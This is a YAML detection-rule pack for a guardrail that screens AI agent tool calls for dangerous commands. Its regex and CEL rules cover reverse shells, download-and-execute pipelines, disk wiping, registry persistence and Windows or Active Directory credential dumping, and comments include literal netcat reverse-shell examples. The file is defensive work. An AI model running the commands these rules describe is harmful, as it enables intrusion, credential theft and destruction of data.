version: 1
category: command
rules:
  - id: CMD-REVSHELL-POWERSHELL-TCP
    tool_call_only: true
    pattern: '(?is)\bNew-Object\s+(?:System\.)?Net\.Sockets\.TCPClient\s*\([^)\r\n]{1,512}\)\s*;.{0,1000}\.GetStream\s*\(\s*\)\s*;.{0,1000}\.Read\s*\([^)\r\n]{1,512}\).{0,1000}\b(?:iex|Invoke-Expression)\b.{0,1000}\.Write\s*\('
    title: "PowerShell TCP command-execution loop"
    severity: CRITICAL
    confidence: 0.99
    tags: [reverse-shell, execution, network]
  - id: CMD-REVSHELL-BASH
    expression: >-
      f.commands.exists(c, c.program in ['nc', 'nc.exe', 'ncat', 'ncat.exe', 'netcat', 'socat'] &&
      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CONNECT in c.operations ||
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_LISTEN in c.operations) &&
      f.paths.exists(p, p.command_id == c.id &&
      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_EXECUTE) &&
      f.network.exists(n, n.command_id == c.id &&
      n.action in [defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_CONNECT,
      defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_LISTEN]))
    pattern: '(?i)bash\s+-i\s+>&\s*/dev/tcp/'
    title: "Bash reverse shell"
    severity: CRITICAL
    confidence: 0.98
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-DEVTCP
    # Candidate selection requires an interactive shell; opening a standalone
    # bidirectional descriptor is a legitimate health-probe primitive.
    pattern: '(?i)\b(?:bash|sh|dash|ksh|zsh)\b[^\r\n]{0,192}(?:-[A-Za-z]*i[A-Za-z]*|--interactive)\b[^\r\n]{0,512}/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b'
    title: "Reverse shell via /dev/tcp"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-NC
    # Backport of default pack: match BOTH netcat reverse-shell orderings:
    #   - destination-first:  nc 1.2.3.4 4444 -e /bin/sh
    #   - flag-first:         nc -e /bin/sh 1.2.3.4 4444
    pattern: '(?i)(?:\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)|\bmkfifo\b[^;\r\n]{1,256};[^|\r\n]{1,512}\|\s*(?:nc|ncat|netcat)\b[^;\r\n]{1,256}>\s*/(?:tmp|var/tmp|dev/shm)/)'
    title: "Netcat reverse shell with -e"
    severity: CRITICAL
    confidence: 0.95
    tags: [execution, reverse-shell]
  - id: CMD-REVSHELL-PYTHON
    # Candidate filter only. The trusted-action prerequisite additionally
    # binds one Python -c ActionFact to a literal nonlocal INET destination,
    # static shell launch, and socket-to-stdin/stdout/stderr handoff.
    pattern: '(?is)\bpython[23]?\s+-c\s+.{0,800}?\bsocket\s*\.\s*socket\s*\(\s*(?:(?:socket\s*\.\s*)?AF_INET6?(?:\s*,[^)]{0,160})?)?\s*\).{0,800}?\.\s*connect\s*\(\s*\(\s*["''](?:(?:\d{1,3}\.){3}\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)["'']\s*,\s*\d{1,5}\s*\)\s*\).{0,800}?(?:os\s*\.\s*dup2\s*\(|(?:sys\s*\.\s*)?(?:stdin|stdout|stderr)\s*=.{0,120}?(?:makefile|fdopen|reopen)).{0,800}?(?:pty\s*\.\s*spawn|subprocess\s*\.\s*(?:Popen|call|run)|os\s*\.\s*(?:system|exec[a-z]*))\s*\('
    title: "Python reverse shell"
    severity: CRITICAL
    confidence: 0.90
    tags: [execution, reverse-shell]
  - id: CMD-PIPE-CURL
    tool_call_only: true
    expression: 'false'
    # Candidate discovery covers POSIX curl pipelines and PowerShell web-cmdlet
    # aliases. The exact fallback contract proves stdout-to-interpreter flow.
    pattern: 'a^'
    title: "curl piped to shell"
    severity: HIGH
    confidence: 0.95
    tags: [execution, download-exec]
  - id: CMD-PIPE-WGET
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['wget', 'wget.exe'] &&
      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_FETCH in c.operations ||
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in c.operations))
    # Backport of default pack (parity with CMD-PIPE-CURL above).
    pattern: '(?i)\bwget\b\s+[^|]*\|\s*(?:[/\w.-]+/)?(?:bash|zsh|sh|dash|ksh|python(?:[0-9.]*)?|perl|ruby)\b'
    title: "wget piped to shell"
    severity: HIGH
    confidence: 0.95
    tags: [execution, download-exec]
  - id: CMD-PIPE-BASE64
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['base64', 'base64.exe'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_DECODE in c.operations)
    # Backport of default pack (parity with CMD-PIPE-CURL above).
    pattern: '(?i:\bbase64\b)[^|;\n]*\s(?:-d+i?|--decode)\b[^|;\n]*\|\s*(?i:(?:[/\w.-]+/)?(?:bash|zsh|sh|dash|ksh|python(?:[0-9.]*)?|perl|ruby))\b'
    title: "base64 decode piped to shell"
    severity: HIGH
    confidence: 0.95
    tags: [execution, obfuscation]
  - id: CMD-REMOTE-PAYLOAD-EXEC-CLEANUP
    pattern: '(?is)\b(?:curl|wget)\b[^;\r\n]*https?://(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?/[^\s;]+(?:;|\s{2,})[^\r\n]*?\bchmod\s+(?:\+x|[0-7]*7[0-7]*)\s+\S+(?:;|\s{2,})[^\r\n]*?(?:\./|(?:ba)?sh\s+)\S+(?:[ \t][^;\r\n \t]+)*(?:;|[ \t]{2,})[^\r\n]*?(?:rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+(?:\*|[A-Za-z0-9_.-]+\*)|history\s+-c)'
    title: "Remote payload execution with anti-forensic cleanup"
    severity: CRITICAL
    confidence: 0.99
    tags: [execution, download-exec, destructive]
  - id: exec.remote_ip_download_execute_same_artifact
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['curl', 'wget'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_FETCH in c.operations)
    # Candidate only. The fallback contract requires a literal public IP,
    # one exact downloaded path, and later execution of that same path.
    pattern: '(?is)\b(?:curl|wget)\b[^\r\n]{0,900}?https?://(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?/[^\s;|&]+[\s\S]{0,700}?(?:(?:bash|sh)\s+)?/(?:tmp|var/tmp|dev/shm)/[^\s;|&]+'
    title: "Literal public-IP download executed from the same path"
    severity: CRITICAL
    confidence: 0.99
    tags: [execution, download-exec, bounded-lineage]
  - id: CMD-EVAL
    pattern: '(?i)(?:^|[;&|\r\n]\s*)eval\s+["''\$\(]'
    title: "Shell eval with dynamic input"
    severity: HIGH
    confidence: 0.85
    tags: [execution]
  - id: CMD-RM-RF
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_DELETE in c.operations &&
      f.paths.exists(p, p.command_id == c.id &&
      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_DELETE))
    pattern: '(?i)\brm\s+(?:-[a-zA-Z]*\s+)*(?:-[a-zA-Z]*)?(?:r[a-zA-Z]*f|f[a-zA-Z]*r)\b(?:\s+\S+)*\s+/(?:$|["''\s,}\]]|(?:etc|bin|sbin|usr|var|home|root|opt|boot|lib(?:64)?|srv|mnt|dev|proc|sys)/?(?:$|["''\s,}\]]))'
    title: "Recursive force delete from critical root path"
    severity: CRITICAL
    confidence: 0.95
    tags: [destructive]
  - id: CMD-MKFS
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program in ['mkfs', 'mkfs.ext2', 'mkfs.ext3', 'mkfs.ext4', 'mke2fs', 'mkfs.xfs', 'mkfs.btrfs', 'mkfs.f2fs', 'mkfs.vfat', 'mkdosfs', 'mkfs.ntfs', 'mkntfs', 'mkfs.minix', 'mkswap', 'mkfs.exfat', 'mkexfatfs'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_DISK_WRITE in c.operations &&
      f.paths.exists(p, p.command_id == c.id &&
      p.access in [defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_WRITE,
      defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_APPEND] &&
      p.flavor == defenseclaw.guardrail.semantic.v1.PathFlavor.PATH_FLAVOR_DEVICE))
    pattern: '(?i)(?:^|[;&|\r\n]\s*)(?:sudo\s+)?(?:mkfs(?:\.(?:ext2|ext3|ext4|xfs|btrfs|f2fs|vfat|ntfs|exfat|minix))?|mke2fs|mkdosfs|mkntfs|mkswap|mkexfatfs)(?:\s|$)'
    title: "Filesystem format command"
    severity: HIGH
    confidence: 0.90
    tags: [destructive]
  - id: CMD-DEVICE-WIPE
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program != 'dd' &&
      !(c.program in ['mkfs', 'mkfs.ext2', 'mkfs.ext3', 'mkfs.ext4', 'mke2fs', 'mkfs.xfs', 'mkfs.btrfs', 'mkfs.f2fs', 'mkfs.vfat', 'mkdosfs', 'mkfs.ntfs', 'mkntfs', 'mkfs.minix', 'mkswap', 'mkfs.exfat', 'mkexfatfs']) &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_DISK_WRITE in c.operations &&
      f.paths.exists(p, p.command_id == c.id &&
      p.access in [defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_WRITE,
      defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_APPEND] &&
      p.flavor == defenseclaw.guardrail.semantic.v1.PathFlavor.PATH_FLAVOR_DEVICE))
    # dd and filesystem formatters retain their dedicated stable rule IDs;
    # every other proven device write or append is owned here.
    # Semantic-only: raw mentions of common verbs such as `tee` and `format`
    # are not evidence of a destructive device write.
    pattern: 'a^'
    title: "Destructive write to a disk device"
    severity: CRITICAL
    confidence: 0.90
    tags: [destructive]
  - id: impact.credential_file_secure_delete
    tool_call_only: true
    # Cheap routing predicate only. The code-owned semantic prerequisite proves
    # exact --remove semantics and a non-fixture credential-file target.
    expression: "f.commands.exists(c, c.program == 'shred')"
    pattern: 'a^'
    title: "Secure deletion of a credential file"
    severity: HIGH
    confidence: 0.99
    tags: [impact, destructive, credential, bounded-grammar]
  - id: CMD-DD-IF
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program == 'dd' &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_DISK_WRITE in c.operations &&
      f.paths.exists(p, p.command_id == c.id &&
      p.access in [defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_WRITE,
      defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_APPEND] &&
      p.flavor == defenseclaw.guardrail.semantic.v1.PathFlavor.PATH_FLAVOR_DEVICE))
    pattern: '(?i)\bdd\s+if='
    title: "dd disk write"
    severity: HIGH
    confidence: 0.80
    tags: [destructive]
  - id: CMD-CHMOD-WORLD
    expression: 'false'
    pattern: 'a^'
    title: "chmod world-writable"
    severity: HIGH
    confidence: 0.80
    tags: [privilege]
  - id: CMD-CHOWN-ROOT
    # Root ownership is ordinary administration, not deterministic attack
    # proof. Sensitive ownership changes remain covered by the typed
    # CMD-CHMOD-WORLD semantic owner.
    pattern: 'a^'
    title: "chown to root"
    severity: HIGH
    confidence: 0.75
    tags: [privilege]
  - id: CMD-SUDO
    expression: 'false'
    pattern: 'a^'
    title: "sudo invocation"
    severity: LOW
    confidence: 0.50
    tags: [privilege]
  - id: CMD-ETC-WRITE
    pattern: 'a^'
    title: "Generic write redirect to /etc/ (strict telemetry only)"
    severity: CRITICAL
    confidence: 0.90
    tags: [system-file]
  - id: CMD-CRONTAB
    expression: 'false'
    pattern: 'a^'
    title: "Crontab modification"
    severity: HIGH
    confidence: 0.75
    tags: [persistence]
  - id: CMD-WIN-REG-PERSIST
    # Registry autostart and service installation are dual-use without a
    # policy-protected target or a bounded payload proof. Permissive reports
    # the exact mutation; strict retains synchronous blocking.
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program in ['reg', 'reg.exe', 'set-itemproperty', 'sp', 'new-itemproperty'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CONFIG_CHANGE in c.operations)
    pattern: '(?i)\b(?:reg(?:\.exe)?\s+add|(?:set|new)-itemproperty)\b'
    title: "Windows registry persistence modification"
    severity: HIGH
    confidence: 0.97
    tags: [persistence, windows]
  - id: credential.windows_registry_hive_dump
    tool_call_only: true
    expression: >-
      f.paths.exists(p, p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_READ &&
      p.flavor == defenseclaw.guardrail.semantic.v1.PathFlavor.PATH_FLAVOR_REGISTRY &&
      p.normalized in ['HKLM/SAM', 'HKLM/sam']) &&
      f.paths.exists(p, p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_READ &&
      p.flavor == defenseclaw.guardrail.semantic.v1.PathFlavor.PATH_FLAVOR_REGISTRY &&
      p.normalized in ['HKLM/SYSTEM', 'HKLM/system'])
    pattern: '(?i)(?:\breg(?:\.exe)?\s+(?:save|export)\s+(?:HKLM|HKEY_LOCAL_MACHINE)[\\/]SAM\b[\s\S]{0,600}\breg(?:\.exe)?\s+(?:save|export)\s+(?:HKLM|HKEY_LOCAL_MACHINE)[\\/]SYSTEM\b|\breg(?:\.exe)?\s+(?:save|export)\s+(?:HKLM|HKEY_LOCAL_MACHINE)[\\/]SYSTEM\b[\s\S]{0,600}\breg(?:\.exe)?\s+(?:save|export)\s+(?:HKLM|HKEY_LOCAL_MACHINE)[\\/]SAM\b)'
    title: "Bounded SAM and SYSTEM registry hive dump"
    severity: HIGH
    confidence: 0.99
    tags: [credential, windows, bounded-lineage]
  - id: credential.windows_lsass_memory_dump
    tool_call_only: true
    pattern: '(?is)(?:\bprocdump(?:\.exe)?\b.{0,240}?(?:-ma|-mm)\s+lsass(?:\.exe)?\s+\S+\.dmp\b|\bget-process\s+lsass(?:\.exe)?\s*\|\s*out-minidump\b|\brundll32(?:\.exe)?\b[^\r\n]{0,260}\bcomsvcs\.dll\s*,?\s+minidump\s+\(\s*get-process\s+lsass(?:\.exe)?\s*\)\.id\s+\S{1,260}\s+full\b)'
    title: "Dump Windows LSASS credential memory"
    severity: HIGH
    confidence: 0.99
    tags: [credential, windows, credential-dumping]
  - id: credential.windows_ntds_ifm_dump
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['ntdsutil', 'ntdsutil.exe'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_WRITE in c.operations)
    pattern: '(?i)\bntdsutil(?:\.exe)?\s+"?(?:ac i|activate instance) ntds"?\s+"?ifm"?\s+"?create full [A-Z]:\\[^"\r\n]+"?\s+q\s+q(?:\s|$)'
    title: "Export the full Active Directory database with NTDS IFM"
    severity: HIGH
    confidence: 0.99
    tags: [credential, active-directory, windows, credential-dumping]
  - id: credential.directory_credential_acquisition
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program in ['impacket-secretsdump', 'secretsdump.py',
      'impacket-getuserspns', 'getuserspns.py',
      'impacket-getnpusers', 'getnpusers.py', 'hashcat', 'hashcat.exe', 'john', 'john.exe',
      'nxc', 'netexec', 'crackmapexec'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations)
    pattern: '(?i)\b(?:impacket-(?:secretsdump|getuserspns|getnpusers)|(?:secretsdump|getuserspns|getnpusers)\.py|hashcat(?:\.exe)?|john(?:\.exe)?\b[^\r\n]*--format(?:=|\s+)krb5(?:tgs|asrep)|(?:nxc|netexec|crackmapexec)\b[^\r\n]*(?:--ntds|-M\s+ntdsutil))\b'
    title: "Exact directory credential acquisition"
    severity: HIGH
    confidence: 0.99
    tags: [credential, active-directory, credential-dumping, bounded-grammar]
  - id: credential.directory_ticket_request
    tool_call_only: true
    # The non-enforcing half of the directory credential vocabulary. The code-owned
    # prerequisite accepts only Kerberos service-ticket (kerberoast) and AS-REP
    # requests, and abstains as soon as the same action also proves a dump or an
    # offline crack -- those belong to credential.directory_credential_acquisition
    # above, which blocks.
    #
    # This half stays at HIGH (alert) on purpose, in every profile. A ticket request
    # is the step whose RESULT credential.returned_kerberos_tgs exists to observe;
    # blocking the request would prevent the returned TGS from ever being seen and
    # would remove a shipped result-backed detection instead of adding one. Keeping
    # it at HIGH is also exactly the pre-existing behaviour for these programs, so
    # this rule is a no-op against main for the request class.
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program in ['impacket-getuserspns', 'getuserspns.py',
      'impacket-getnpusers', 'getnpusers.py'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations)
    pattern: '(?i)\b(?:impacket-(?:getuserspns|getnpusers)|(?:getuserspns|getnpusers)\.py)\b'
    title: "Exact Kerberos ticket request"
    severity: HIGH
    confidence: 0.99
    tags: [credential, active-directory, kerberos, bounded-grammar]
  - id: credential.pkcs12_private_key_extract
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['openssl', 'openssl.exe'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations)
    pattern: '(?i)\bopenssl(?:\.exe)?\s+pkcs12\b[^\r\n]{0,260}\s-nodes(?:\s|$)'
    title: "Extract an unencrypted private key from a PKCS#12 bundle"
    severity: HIGH
    confidence: 0.99
    tags: [credential, private-key, pkcs12, bounded-grammar]
  - id: credential.kerberos_ticket_forgery
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program in ['impacket-ticketer', 'ticketer.py'] &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations &&
      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_WRITE in c.operations)
    pattern: 'a^'
    title: "Forge a Kerberos ticket from static key material"
    severity: LOW
    confidence: 0.99
    tags: [credential, active-directory, kerberos, ticket-forgery, bounded-grammar]
  - id: credential.structured_directory_acquisition
    tool_call_only: true
    expression: "f.tool in ['secretsdump', 'hashcat_crack', 'kerberoast']"
    pattern: 'a^'
    title: "Structured directory credential acquisition"
    severity: HIGH
    confidence: 0.99
    tags: [credential, active-directory, credential-dumping, structured-tool, bounded-grammar]
  - id: chain.compromised_credential_then_successful_authentication
    tool_call_only: true
    expression: >-
      f.tool in ['add_compromised_account', 'update_compromised_account'] ||
      f.commands.exists(c, c.argv_complete && c.program in ['nxc', 'netexec', 'crackmapexec'])
    # Catalog anchor only. The code-owned matcher requires successful paired
    # results and exact process-keyed account and credential HMAC joins.
    pattern: 'a^'
    title: "Recorded compromised credential used for successful authentication"
    severity: HIGH
    confidence: 0.99
    tags: [credential, active-directory, authentication, bounded-lineage, detection-only]
  - id: chain.adcs_certificate_request_then_pfx_authentication
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program in ['certipy', 'certipy-ad'])
    # Catalog anchor only. The code-owned bounded matcher requires a successful
    # certificate request and an exact PFX artifact identity join to authentication.
    pattern: 'a^'
    title: "AD CS certificate impersonation followed by PFX authentication"
    severity: HIGH
    confidence: 0.99
    tags: [credential, active-directory, ad-cs, authentication, bounded-lineage, detection-only]
  - id: chain.s4u_ticket_then_kerberos_secretsdump_same_cache
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete &&
      c.program in ['impacket-getst', 'getst.py', 'impacket-secretsdump', 'secretsdump.py'])
    # Catalog anchor only. The code-owned bounded matcher requires an
    # authenticated S4U2Proxy result and exact saved-cache identity reuse.
    pattern: 'a^'
    title: "Result-backed S4U ticket used for Kerberos-only secretsdump"
    severity: HIGH
    confidence: 0.99
    tags: [credential, active-directory, kerberos, secretsdump, bounded-lineage, detection-only]
  - id: chain.file_read_then_email_same_artifact
    tool_call_only: true
    expression: "f.tool in ['get_file_by_id', 'send_email']"
    # Catalog anchor only. The code-owned bounded matcher requires two
    # authenticated successful calls and exact opaque file-identity continuity.
    # Recipient authorization and file sensitivity are not inferred, so this
    # remains alert-only in every built-in posture.
    pattern: 'a^'
    title: "File read followed by email transfer of the same artifact"
    severity: HIGH
    confidence: 0.98
    tags: [exfiltration, file, email, bounded-lineage, detection-only]
  - id: exfiltration.recursive_model_artifact_external_multipart
    tool_call_only: true
    expression: >-
      f.commands.exists(c, c.argv_complete && c.program in ['python', 'python3'])
    # Inert catalog anchor. The code-owned bounded Python parser must prove
    # recursive traversal and exact opened-file-to-multipart-handle lineage.
    pattern: 'a^'
    title: "Recursive model artifacts uploaded through exact multipart lineage"
    severity: HIGH
    confidence: 0.99
    tags: [exfiltration, model-artifact, checkpoint, multipart, bounded-lineage]
  - id: persistence.malicious_download_execute_payload
    tool_call_only: true
    expression: "f.tool == 'persist'"
    pattern: '(?is)"method"\s*:\s*"(?:cron|systemd|pam_module|registry_run|scheduled_task|wmi_subscription)".{0,1000}"payload"\s*:\s*".{0,1000}\b(?:powershell(?:\.exe)?|curl|wget|nc|ncat|netcat)\b'
    title: "Malicious persistence download-and-execute payload"
    severity: HIGH
    confidence: 0.99
    tags: [persistence, execution, download-exec, structured-tool, bounded-grammar]
